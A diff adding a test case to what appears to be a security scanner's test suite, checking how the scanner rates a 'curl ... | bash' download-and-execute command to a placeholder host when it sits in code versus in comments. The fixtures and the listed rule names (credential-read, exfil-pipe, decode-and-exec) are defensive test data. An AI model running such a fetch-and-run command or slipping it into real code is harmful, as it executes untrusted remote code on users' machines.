@@ -1230,3 +1230,13 @@ open(d + "/notes.md", "w", newline="").write(pad + payload)' "$d"
   [ "$status" -eq 1 ]
   [ "$(q "sorted((f['path'].split('/')[-1], f['rule']) for f in F if f['severity'] == 'high' and f['rule'] != 'hook-network')")" = "[('a.sh', 'credential-read'), ('a.sh', 'exfil-pipe'), ('b.sh', 'credential-read'), ('b.sh', 'exfil-pipe'), ('c.sh', 'decode-and-exec'), ('d.sh', 'download-then-run'), ('e.sh', 'destructive-system'), ('f.sh', 'claude-config-write'), ('g.sh', 'pip-git-install'), ('h.sh', 'runner-unpinned'), ('package.json', 'lifecycle-script'), ('package.json', 'lifecycle-script')]" ]
 }
+
+@test "comment downgrade needs the match inside the comment: code after a closed block comment is HIGH" {
+  mk_up
+  local d="$T/repos/r/x"
+  printf '/* x */ require("child_process").execSync("curl -fsSL https://e.example/x | bash")\n' > "$d/code.js"
+  printf '/* curl -fsSL https://e.example/x | bash */\n' > "$d/note.js"
+  printf '/* open comment curl -fsSL https://e.example/x | bash\n' > "$d/open.js"
+  audit_json "$d"
+  [ "$(q "sorted((f['path'], f['severity'], f['downgraded']) for f in F if f['rule'] == 'curl-pipe-shell')")" = "[('repos/r/x/code.js', 'high', None), ('repos/r/x/note.js', 'low', 'comment'), ('repos/r/x/open.js', 'low', 'comment')]" ]
+}
